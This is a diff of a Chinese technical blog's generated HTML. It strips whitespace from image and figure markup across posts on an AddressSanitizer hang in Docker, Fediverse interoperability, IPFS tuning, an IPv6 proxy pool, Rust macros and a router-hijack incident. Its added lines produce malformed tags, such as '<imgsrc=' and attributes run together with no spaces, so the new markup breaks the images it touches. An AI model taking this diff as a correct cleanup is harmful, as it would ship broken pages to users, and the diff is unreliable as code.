@@ -17,156 +17,56 @@
 </div>
 </div><p>使用 clang 编译并开启 AddressSanitizer: <code>clang -g -fsanitize=address -fno-omit-frame-pointer -o target_asan poc.c</code></p>
 <p>正常情况下运行应该很快输出调用堆栈信息，如图：</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/linux/large-nofile-cause-asan-stuck/asan_normal_works_hu843adcb9f4c3ef501072e5b1b984d972_142890_1243x1001_resize_q75_h2_box_3.webp"
         title="AddressSanitizer 正常输出"
-        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/asan_normal_works_hu843adcb9f4c3ef501072e5b1b984d972_142890_1243x1001_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>AddressSanitizer 正常输出</h2><p>AddressSanitizer 正常输出</p>"
-        
-        >
-        <img
-            
-            src="/posts/linux/large-nofile-cause-asan-stuck/asan_normal_works_hu843adcb9f4c3ef501072e5b1b984d972_142890_1243x1001_resize_q75_h2_box_3.webp"
-            alt="/posts/linux/large-nofile-cause-asan-stuck/asan_normal_works_hu843adcb9f4c3ef501072e5b1b984d972_142890_1243x1001_resize_q75_h2_box_3.webp"
-             height="1001"
-             width="1243"
-            loading="lazy"
+        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/asan_normal_works_hu843adcb9f4c3ef501072e5b1b984d972_142890_1243x1001_resize_q75_h2_box_3.webp"data-sub-html="<h2>AddressSanitizer 正常输出</h2><p>AddressSanitizer 正常输出</p>">
+        <imgsrc="/posts/linux/large-nofile-cause-asan-stuck/asan_normal_works_hu843adcb9f4c3ef501072e5b1b984d972_142890_1243x1001_resize_q75_h2_box_3.webp"
+            alt="/posts/linux/large-nofile-cause-asan-stuck/asan_normal_works_hu843adcb9f4c3ef501072e5b1b984d972_142890_1243x1001_resize_q75_h2_box_3.webp"height="1001"width="1243"loading="lazy"
         />
     </a><figcaption class="image-caption">AddressSanitizer 正常输出</figcaption>
     </figure></p>
 <p>而这在我的 Docker 容器中就会卡住，通过 <code>top</code> 命令可以看到一个子进程占满一个 CPU 核心：</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/linux/large-nofile-cause-asan-stuck/asan_stuck_hu6ff1142a74841c83d7167d84a2641030_34280_947x278_resize_q75_h2_box_3.webp"
         title="卡住的情况"
-        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/asan_stuck_hu6ff1142a74841c83d7167d84a2641030_34280_947x278_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>卡住的情况</h2><p>卡住的情况</p>"
-        
-        >
-        <img
-            
-            src="/posts/linux/large-nofile-cause-asan-stuck/asan_stuck_hu6ff1142a74841c83d7167d84a2641030_34280_947x278_resize_q75_h2_box_3.webp"
-            alt="/posts/linux/large-nofile-cause-asan-stuck/asan_stuck_hu6ff1142a74841c83d7167d84a2641030_34280_947x278_resize_q75_h2_box_3.webp"
-             height="278"
-             width="947"
-            loading="lazy"
+        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/asan_stuck_hu6ff1142a74841c83d7167d84a2641030_34280_947x278_resize_q75_h2_box_3.webp"data-sub-html="<h2>卡住的情况</h2><p>卡住的情况</p>">
+        <imgsrc="/posts/linux/large-nofile-cause-asan-stuck/asan_stuck_hu6ff1142a74841c83d7167d84a2641030_34280_947x278_resize_q75_h2_box_3.webp"
+            alt="/posts/linux/large-nofile-cause-asan-stuck/asan_stuck_hu6ff1142a74841c83d7167d84a2641030_34280_947x278_resize_q75_h2_box_3.webp"height="278"width="947"loading="lazy"
         />
     </a><figcaption class="image-caption">卡住的情况</figcaption>
     </figure></p>
 <p>我一开始以为程序就这样进入死循环了，谁知道等了几分钟竟然也输出了结果。</p>
 <p>于是我开始查资料，在 <a href="https://clang.llvm.org/docs/AddressSanitizer.html#symbolizing-the-reports" target="_blank" rel="noopener noreffer" class="post-link">LLVM 文档</a> 中提到可以通过设置环境变量 <code>ASAN_OPTIONS=symbolize=0</code> 来关闭 symbolize 流程。实验发现关闭符号解析后可以顺利输出后续内容。</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/linux/large-nofile-cause-asan-stuck/asan_options_symbolize_off_huad9cb65d0ed5337ff5eff9c1267928d2_70146_1247x311_resize_q75_h2_box_3.webp"
         title="关闭 symbolize 可以顺利输出"
-        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/asan_options_symbolize_off_huad9cb65d0ed5337ff5eff9c1267928d2_70146_1247x311_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>关闭 symbolize 可以顺利输出</h2><p>关闭 symbolize 可以顺利输出</p>"
-        
-        >
-        <img
-            
-            src="/posts/linux/large-nofile-cause-asan-stuck/asan_options_symbolize_off_huad9cb65d0ed5337ff5eff9c1267928d2_70146_1247x311_resize_q75_h2_box_3.webp"
-            alt="/posts/linux/large-nofile-cause-asan-stuck/asan_options_symbolize_off_huad9cb65d0ed5337ff5eff9c1267928d2_70146_1247x311_resize_q75_h2_box_3.webp"
-             height="311"
-             width="1247"
-            loading="lazy"
+        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/asan_options_symbolize_off_huad9cb65d0ed5337ff5eff9c1267928d2_70146_1247x311_resize_q75_h2_box_3.webp"data-sub-html="<h2>关闭 symbolize 可以顺利输出</h2><p>关闭 symbolize 可以顺利输出</p>">
+        <imgsrc="/posts/linux/large-nofile-cause-asan-stuck/asan_options_symbolize_off_huad9cb65d0ed5337ff5eff9c1267928d2_70146_1247x311_resize_q75_h2_box_3.webp"
+            alt="/posts/linux/large-nofile-cause-asan-stuck/asan_options_symbolize_off_huad9cb65d0ed5337ff5eff9c1267928d2_70146_1247x311_resize_q75_h2_box_3.webp"height="311"width="1247"loading="lazy"
         />
     </a><figcaption class="image-caption">关闭 symbolize 可以顺利输出</figcaption>
     </figure></p>
 <p>一开始我以为是符号解析器出 bug 了，尝试切换符号解析器，将默认的 <code>llvm-symbolizer</code> 替换成 GNU <code>addr2line</code>。</p>
 <p><code>ASAN_SYMBOLIZER_PATH=/usr/bin/addr2line ./target_asan</code></p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/linux/large-nofile-cause-asan-stuck/addr2line_also_stuck_hu8684916663b9aea2101a5b0c731c9e79_37682_915x265_resize_q75_h2_box_3.webp"
         title="addr2line 仍然会卡住"
-        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/addr2line_also_stuck_hu8684916663b9aea2101a5b0c731c9e79_37682_915x265_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>addr2line 仍然会卡住</h2><p>addr2line 仍然会卡住</p>"
-        
-        >
-        <img
-            
-            src="/posts/linux/large-nofile-cause-asan-stuck/addr2line_also_stuck_hu8684916663b9aea2101a5b0c731c9e79_37682_915x265_resize_q75_h2_box_3.webp"
-            alt="/posts/linux/large-nofile-cause-asan-stuck/addr2line_also_stuck_hu8684916663b9aea2101a5b0c731c9e79_37682_915x265_resize_q75_h2_box_3.webp"
-             height="265"
-             width="915"
-            loading="lazy"
+        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/addr2line_also_stuck_hu8684916663b9aea2101a5b0c731c9e79_37682_915x265_resize_q75_h2_box_3.webp"data-sub-html="<h2>addr2line 仍然会卡住</h2><p>addr2line 仍然会卡住</p>">
+        <imgsrc="/posts/linux/large-nofile-cause-asan-stuck/addr2line_also_stuck_hu8684916663b9aea2101a5b0c731c9e79_37682_915x265_resize_q75_h2_box_3.webp"
+            alt="/posts/linux/large-nofile-cause-asan-stuck/addr2line_also_stuck_hu8684916663b9aea2101a5b0c731c9e79_37682_915x265_resize_q75_h2_box_3.webp"height="265"width="915"loading="lazy"
         />
     </a><figcaption class="image-caption">addr2line 仍然会卡住</figcaption>
     </figure></p>
 <p>仍然卡住，于是我怀疑不是 <code>llvm-symbolizer</code> 的问题，感觉有可能是系统内核的问题，或者因为最新版 Docker 与内核冲突了？具体也不清楚，反正没有头绪。</p>
 <p>当我把程序拷贝到宿主机上运行时，这个问题就莫名其妙的消失了。我将容器打包拷贝到同学的 Ubuntu 下，无法复现问题，也是顺利输出。我还尝试了将 Host 内核降级到 5.15，将 <code>Docker</code>/<code>Containerd</code>/<code>runc</code> 版本降级到与同学 Ubuntu 上相同的版本，均无法解决问题。</p>
 <p>后面通过 strace 发现 AddressSanitizer 卡在 read 系统调用上，并通过上下文猜到与 <code>llvm-symbolizer</code> 交互的流程。</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/linux/large-nofile-cause-asan-stuck/strace_stuck_in_read_hucfed7316ff0b1fed3a9a63b776d472d2_56014_907x471_resize_q75_h2_box_3.webp"
         title="strace 发现卡 read 系统调用"
-        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/strace_stuck_in_read_hucfed7316ff0b1fed3a9a63b776d472d2_56014_907x471_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>strace 发现卡 read 系统调用</h2><p>strace 发现卡 read 系统调用</p>"
-        
-        >
-        <img
-            
-            src="/posts/linux/large-nofile-cause-asan-stuck/strace_stuck_in_read_hucfed7316ff0b1fed3a9a63b776d472d2_56014_907x471_resize_q75_h2_box_3.webp"
-            alt="/posts/linux/large-nofile-cause-asan-stuck/strace_stuck_in_read_hucfed7316ff0b1fed3a9a63b776d472d2_56014_907x471_resize_q75_h2_box_3.webp"
-             height="471"
-             width="907"
-            loading="lazy"
+        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/strace_stuck_in_read_hucfed7316ff0b1fed3a9a63b776d472d2_56014_907x471_resize_q75_h2_box_3.webp"data-sub-html="<h2>strace 发现卡 read 系统调用</h2><p>strace 发现卡 read 系统调用</p>">
+        <imgsrc="/posts/linux/large-nofile-cause-asan-stuck/strace_stuck_in_read_hucfed7316ff0b1fed3a9a63b776d472d2_56014_907x471_resize_q75_h2_box_3.webp"
+            alt="/posts/linux/large-nofile-cause-asan-stuck/strace_stuck_in_read_hucfed7316ff0b1fed3a9a63b776d472d2_56014_907x471_resize_q75_h2_box_3.webp"height="471"width="907"loading="lazy"
         />
     </a><figcaption class="image-caption">strace 发现卡 read 系统调用</figcaption>
     </figure></p>
@@ -175,92 +75,32 @@
 <p>但是这个时候我是一筹莫展，睡觉前在 <a href="https://twitter.com/zu1k_/status/1668635289433292885" target="_blank" rel="noopener noreffer" class="post-link">Twitter 上求助</a>，看看有没有人也遇到过这个问题。</p>
 <h2 id="深入"><a href="#深入" class="header-mark headerLink">深入</a></h2>
 <p>根据网友 <a href="https://twitter.com/whsloef/status/1668636143863369729" target="_blank" rel="noopener noreffer" class="post-link">whsloef 的回复</a>，我打印了阻塞的进程的调用栈，跟我通过 strace 得到的结论相同，是卡 read 系统调用了。</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/linux/large-nofile-cause-asan-stuck/cat_stack_hu91b90d96476c14248a3c1870987a44bd_56594_1253x302_resize_q75_h2_box_3.webp"
         title="打印调用栈"
-        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/cat_stack_hu91b90d96476c14248a3c1870987a44bd_56594_1253x302_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>打印调用栈</h2><p>打印调用栈</p>"
-        
-        >
-        <img
-            
-            src="/posts/linux/large-nofile-cause-asan-stuck/cat_stack_hu91b90d96476c14248a3c1870987a44bd_56594_1253x302_resize_q75_h2_box_3.webp"
-            alt="/posts/linux/large-nofile-cause-asan-stuck/cat_stack_hu91b90d96476c14248a3c1870987a44bd_56594_1253x302_resize_q75_h2_box_3.webp"
-             height="302"
-             width="1253"
-            loading="lazy"
+        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/cat_stack_hu91b90d96476c14248a3c1870987a44bd_56594_1253x302_resize_q75_h2_box_3.webp"data-sub-html="<h2>打印调用栈</h2><p>打印调用栈</p>">
+        <imgsrc="/posts/linux/large-nofile-cause-asan-stuck/cat_stack_hu91b90d96476c14248a3c1870987a44bd_56594_1253x302_resize_q75_h2_box_3.webp"
+            alt="/posts/linux/large-nofile-cause-asan-stuck/cat_stack_hu91b90d96476c14248a3c1870987a44bd_56594_1253x302_resize_q75_h2_box_3.webp"height="302"width="1253"loading="lazy"
         />
     </a><figcaption class="image-caption">打印调用栈</figcaption>
     </figure></p>
 <p>然后根据网友 <a href="https://twitter.com/JXQNHZr1yUAj5Be/status/1668684560195010561" target="_blank" rel="noopener noreffer" class="post-link">Ningcong Chen 回复</a> 的一个历史 issue，我尝试用 gdb 来附加阻塞进程。（我之前考虑过给占用 100% 的进程做 profile，看看到底是什么行为占满 CPU，但考虑 AddressSanitizer 是 clang 注入的，不清楚好不好做，于是就没做）</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_1_hu5fd188a493f98ec7189955c1da6cca08_6245292_2503x830_resize_q75_h2_box_3.webp"
         title="附加主进程"
-        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_1_hu5fd188a493f98ec7189955c1da6cca08_6245292_2503x830_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>附加主进程</h2><p>附加主进程</p>"
-        
-        >
-        <img
-            
-            src="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_1_hu5fd188a493f98ec7189955c1da6cca08_6245292_2503x830_resize_q75_h2_box_3.webp"
-            alt="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_1_hu5fd188a493f98ec7189955c1da6cca08_6245292_2503x830_resize_q75_h2_box_3.webp"
-             height="830"
-             width="2503"
-            loading="lazy"
+        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_1_hu5fd188a493f98ec7189955c1da6cca08_6245292_2503x830_resize_q75_h2_box_3.webp"data-sub-html="<h2>附加主进程</h2><p>附加主进程</p>">
+        <imgsrc="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_1_hu5fd188a493f98ec7189955c1da6cca08_6245292_2503x830_resize_q75_h2_box_3.webp"
+            alt="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_1_hu5fd188a493f98ec7189955c1da6cca08_6245292_2503x830_resize_q75_h2_box_3.webp"height="830"width="2503"loading="lazy"
         />
     </a><figcaption class="image-caption">附加主进程</figcaption>
     </figure></p>
 <p>附加主进程后，发现卡在 <code>internal_read</code>，推测是子进程没有返回。</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_2_hu6d0f57975e98a16e3a64039d6dd5528d_257129_2384x791_resize_q75_h2_box_3.webp"
         title="附加子进程"
-        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_2_hu6d0f57975e98a16e3a64039d6dd5528d_257129_2384x791_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>附加子进程</h2><p>附加子进程</p>"
-        
-        >
-        <img
-            
-            src="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_2_hu6d0f57975e98a16e3a64039d6dd5528d_257129_2384x791_resize_q75_h2_box_3.webp"
-            alt="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_2_hu6d0f57975e98a16e3a64039d6dd5528d_257129_2384x791_resize_q75_h2_box_3.webp"
-             height="791"
-             width="2384"
-            loading="lazy"
+        data-thumbnail="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_2_hu6d0f57975e98a16e3a64039d6dd5528d_257129_2384x791_resize_q75_h2_box_3.webp"data-sub-html="<h2>附加子进程</h2><p>附加子进程</p>">
+        <imgsrc="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_2_hu6d0f57975e98a16e3a64039d6dd5528d_257129_2384x791_resize_q75_h2_box_3.webp"
+            alt="/posts/linux/large-nofile-cause-asan-stuck/gdb_attach_2_hu6d0f57975e98a16e3a64039d6dd5528d_257129_2384x791_resize_q75_h2_box_3.webp"height="791"width="2384"loading="lazy"
         />
     </a><figcaption class="image-caption">附加子进程</figcaption>
     </figure></p>
@@ -383,47 +223,15 @@
 <p>这个协议规范了去中心化社交网络交互细节的各方面，包括用户的交互(收发信息、关注、喜欢)，还有活动(就是内容、推文、嘟文)的发布、更新、删除、喜欢、屏蔽等等。</p>
 <p>如果各个平台都遵循相同的协议，那使用不同平台的用户就可以在同一 Fediverse 中交互，举个例子，我可以在 Mastodon 和 Pixelfed 这两个不同的平台之间进行一些简单的交互。</p>
 <p>我测试用 Pixelfed 平台的账号(<code>@zu1k@pixey.org</code>) 关注我的 Mastodon 账号(<code>@zu1k@fosstodon.org</code>)，可以成功搜索到用户，显示头像、简介、关注量等信息，可以成功关注。在 Mastodon 平台也可以即时收到被关注的通知，同时可以通过 Mastodon 查看 Pixelfed 的账号信息。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/fediverse/mastodon_pixelfed_hu52eac44f8e02f5abb2301fade121986a_123532_1328x646_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/fediverse/mastodon_pixelfed_hu52eac44f8e02f5abb2301fade121986a_123532_1328x646_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/fediverse/mastodon_pixelfed_hu52eac44f8e02f5abb2301fade121986a_123532_1328x646_resize_q75_h2_box_3.webp"
-        title="Pixelfed 账号关注 Mastodon 账号"
-         height="646"
-         width="1328"
-        loading="lazy"
+        title="Pixelfed 账号关注 Mastodon 账号"height="646"width="1328"loading="lazy"
     /></p>
 <p>但是我在 Pixelfed 发布的内容，从 Mastodon 却无法看到，这说明两个应用虽然都使用 ActivityPub 协议，但是其在内容封装方面有自己专属的子协议，这些子协议之间并不互相兼容，只有那些公共的兼容的协议才能跨应用使用，例如账户信息、关注这类。</p>
 <p>同时我还尝试使用 Mastodon 查看 Lemmy 的用户，可以看到用户信息，发布的部分内容可以看到，有一些出入，说明这两者之间也是有不兼容的地方。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/fediverse/mastodon_lemmy_hu3d786cdeffe43d68657c9af44c7cff39_1770398_3321x2093_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/fediverse/mastodon_lemmy_hu3d786cdeffe43d68657c9af44c7cff39_1770398_3321x2093_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/fediverse/mastodon_lemmy_hu3d786cdeffe43d68657c9af44c7cff39_1770398_3321x2093_resize_q75_h2_box_3.webp"
-        title="Mastodon 查看 Lemmy 用户"
-         height="2093"
-         width="3321"
-        loading="lazy"
+        title="Mastodon 查看 Lemmy 用户"height="2093"width="3321"loading="lazy"
     /></p>
 <p>通过 Lemmy 的 issue 和 PR 列表我看到 Lemmy 正在做与 Mastodon 的兼容工作，这很伟大，支持！</p>
 <p>同时，一位 GitHub 的员工开发了一个有意思的东西，<a href="https://github.com/davecheney/pub" target="_blank" rel="noopener noreffer" class="post-link">ActivityPub to Mastodon bridge</a>。pub 的目的不是托管 ActivityPub 社区，而是旨在使拥有自己域并因此控制其身份的人能够参与 Fediverse，这意味着你无需搭建 Mastodon 就可以用自己的域名加入到 Mastodon 联邦中了，这就很方便了，轻量好用啊。</p>
@@ -542,47 +350,15 @@
 <p>web3.storage 免费提供 1T，但是 Pin Api 需要发邮件申请，一天以内就会有回复。<a href="https://web3.storage/docs/how-tos/pinning-services-api/" target="_blank" rel="noopener noreffer" class="post-link">[教程]</a></p>
 <h3 id="开放端口"><a href="#开放端口" class="header-mark headerLink">开放端口</a></h3>
 <p>因为 IPFS 需要 P2P 通讯，所以如果你没有公网的 IPFS 节点 Pin 你的内容，就需要保证自己本机的 IPFS 节点可被访问。检查你的路由器，开启 UPnP 功能，必要时建立端口映射，开放你的 4001 端口（如果没有修改过的话）。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs-easy-use/nat-mapping_huc68249edc18ae4d99b6de292707b695f_10157_789x82_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs-easy-use/nat-mapping_huc68249edc18ae4d99b6de292707b695f_10157_789x82_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs-easy-use/nat-mapping_huc68249edc18ae4d99b6de292707b695f_10157_789x82_resize_q75_h2_box_3.webp"
-        title="NAT 端口映射"
-         height="82"
-         width="789"
-        loading="lazy"
+        title="NAT 端口映射"height="82"width="789"loading="lazy"
     /></p>
 <h2 id="资源占用优化"><a href="#资源占用优化" class="header-mark headerLink">资源占用优化</a></h2>
 <p>如果你没有做任何的配置优化，只是按照常规流程下载安装运行，你会发现 IPFS 在后台会占用大量的 CPU 资源和内存，你的风扇开始狂转；维持了大量的网络连接，导致你的网络卡顿。这是因为 IPFS 的默认配置并没有针对个人小主机进行优化，如果你在一台 2 核的 Linux 服务器上运行，IPFS 甚至能吃满你所有的 CPU，网络的拥挤程度有可能使你连 ssh 登录都成了一个问题。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs-easy-use/ipfs-origin-high_hu3eea88f8be2338a28eef177f823f2105_36095_828x210_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs-easy-use/ipfs-origin-high_hu3eea88f8be2338a28eef177f823f2105_36095_828x210_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs-easy-use/ipfs-origin-high_hu3eea88f8be2338a28eef177f823f2105_36095_828x210_resize_q75_h2_box_3.webp"
-        title="IPFS 占用大量资源"
-         height="210"
-         width="828"
-        loading="lazy"
+        title="IPFS 占用大量资源"height="210"width="828"loading="lazy"
     /></p>
 <p>这个时候我们就需要调整配置文件中的参数来想办法降低资源占用，以使 IPFS 不影响我们的日常工作。其实 IPFS 已经提供了<a href="https://docs.ipfs.io/how-to/default-profile/" target="_blank" rel="noopener noreffer" class="post-link">好几个配置文件</a>，通过 <code>ipfs config profile --help</code> 可查看具体介绍。</p>
 <blockquote>
@@ -590,25 +366,9 @@
 </blockquote>
 <p>我推荐在低配置的服务器和个人电脑上应用 <code>lowpower</code> 配置，<code>ipfs config profile apply lowpower</code>，这会限制 IPFS 维持的连接数量，降低网络占用，还会降低 GC 频率，这可以明显的降低 cpu 占用，我的测试可以使 cpu 占用从 80% 以上降低到 20% 以下。当然，资源占用的降低也会导致通讯效率的降低，会使内容寻址时间增长，影响使用的体验。如果你的使用方式是类似于 RSS 订阅和离线查看的模式，增长的寻址时间可以忽略不记。</p>
 <p>如果你是在拥有公网 IP 的服务器上运行 IPFS，还推荐应用 <code>server</code> 配置，<code>ipfs config profile apply server</code>，这会关闭本地网络的节点发现，因为这是无意义的，这样也可以降低网络占用。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs-easy-use/ipfs-now-low_hucf37f9c7b9809966f20b342d5b3216f0_47398_813x258_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs-easy-use/ipfs-now-low_hucf37f9c7b9809966f20b342d5b3216f0_47398_813x258_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs-easy-use/ipfs-now-low_hucf37f9c7b9809966f20b342d5b3216f0_47398_813x258_resize_q75_h2_box_3.webp"
-        title="IPFS 优化后"
-         height="258"
-         width="813"
-        loading="lazy"
+        title="IPFS 优化后"height="258"width="813"loading="lazy"
     /></p>
 <h2 id="后言"><a href="#后言" class="header-mark headerLink">后言</a></h2>
 <p>20 年 11 月底，我发布了 <a href="../ipfs/" rel="" class="post-link">《IPFS 新手指北》</a> 这篇文章，期待 IPFS 能够迅猛发展，成为下一代 Web 基础设施。不知不觉已经过去一年半了，就目前情况来看 IPFS 虽然仍在不断发展，但还是在半死不活的状态，这一点让我非常失望。</p>
@@ -620,25 +380,9 @@
 <p>昨天我舍友为了爬虫购买了昂贵的 IP 代理池，我在旁边突然萌生了一个想法，现在各大 ISP/IDC 动不动就给你分配一整个 64 位前缀的 IPv6 网段，我们能不能好好利用一下这庞大的 IPv6 IP 资源呢？</p>
 <p>有了这个想法我就睡不着了，今天一大早（9点半）我就起来着手研究，最终成功实现每一个请求从一个单独的 IPv6 地址发出。</p>
 <p>先看效果，我把写好的程序放在服务器上跑了一会，下面是 Cloudflare 统计的访问信息，可以看到独立访问者 (独立 IP) 数量达到了我的小博客前所未有的数量，基本上是一个请求一个独立 IP，效果非常不错。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/http-proxy-ipv6-pool/cf-statistic_huf4251d5f550aa4feede29971b2c7abfb_32579_1045x343_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/http-proxy-ipv6-pool/cf-statistic_huf4251d5f550aa4feede29971b2c7abfb_32579_1045x343_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/http-proxy-ipv6-pool/cf-statistic_huf4251d5f550aa4feede29971b2c7abfb_32579_1045x343_resize_q75_h2_box_3.webp"
-        title="Cloudflare 统计"
-         height="343"
-         width="1045"
-        loading="lazy"
+        title="Cloudflare 统计"height="343"width="1045"loading="lazy"
     /></p>
 <h2 id="教程"><a href="#教程" class="header-mark headerLink">教程</a></h2>
 <p>首先你要有一整个 IPv6 子网路由给你，当遇到吝啬的服务商，即使他们有巨多的 IPv6 资源，他也不给你用，这种情况你没辙。不过幸好，绝大多数 ISP/IDC 都会给你一整个 IPv6 <code>/64</code> 子网，有的甚至可以申请 <code>/56</code> 子网，这数量又增加了好几个数量级，所以你几乎不必担心。</p>
@@ -985,32 +729,12 @@
 </span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>需求本身确实简单，问题在于这个枚举类型的成员太多了，足足有 459 个，按照传统的思路，保守估计至少要写半天，并且很枯燥。图中可以看出，要对该枚举类型实现一个简单的函数都需要上千行。</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/coding/i-love-rust-proc_macro/enum_variants_count_hu370b5981cebfdca4f541bcf123030a54_16393_559x163_resize_q75_h2_box_3.webp"
         title="庞大的枚举类型"
-        data-thumbnail="/posts/coding/i-love-rust-proc_macro/enum_variants_count_hu370b5981cebfdca4f541bcf123030a54_16393_559x163_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>庞大的枚举类型</h2><p>庞大的枚举类型</p>"
-        
-        >
-        <img
-            
-            src="/posts/coding/i-love-rust-proc_macro/enum_variants_count_hu370b5981cebfdca4f541bcf123030a54_16393_559x163_resize_q75_h2_box_3.webp"
-            alt="/posts/coding/i-love-rust-proc_macro/enum_variants_count_hu370b5981cebfdca4f541bcf123030a54_16393_559x163_resize_q75_h2_box_3.webp"
-             height="163"
-             width="559"
-            loading="lazy"
+        data-thumbnail="/posts/coding/i-love-rust-proc_macro/enum_variants_count_hu370b5981cebfdca4f541bcf123030a54_16393_559x163_resize_q75_h2_box_3.webp"data-sub-html="<h2>庞大的枚举类型</h2><p>庞大的枚举类型</p>">
+        <imgsrc="/posts/coding/i-love-rust-proc_macro/enum_variants_count_hu370b5981cebfdca4f541bcf123030a54_16393_559x163_resize_q75_h2_box_3.webp"
+            alt="/posts/coding/i-love-rust-proc_macro/enum_variants_count_hu370b5981cebfdca4f541bcf123030a54_16393_559x163_resize_q75_h2_box_3.webp"height="163"width="559"loading="lazy"
         />
     </a><figcaption class="image-caption">庞大的枚举类型</figcaption>
     </figure></p>
@@ -1544,32 +1268,12 @@
 <p>文中的攻防过程令我很是激动，因为我想起了在2020年初的一件事</p>
 <h2 id="光猫升级事件"><a href="#光猫升级事件" class="header-mark headerLink">光猫升级事件</a></h2>
 <p>2020年1月初，访问某些http协议(80端口)的网站，会被劫持到一个联通光猫升级页面</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"
         title="百度贴吧被劫持到升级页面"
-        data-thumbnail="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>百度贴吧被劫持到升级页面</h2><p>百度贴吧被劫持到升级页面</p>"
-        
-        >
-        <img
-            
-            src="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"
-            alt="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"
-             height="985"
-             width="1919"
-            loading="lazy"
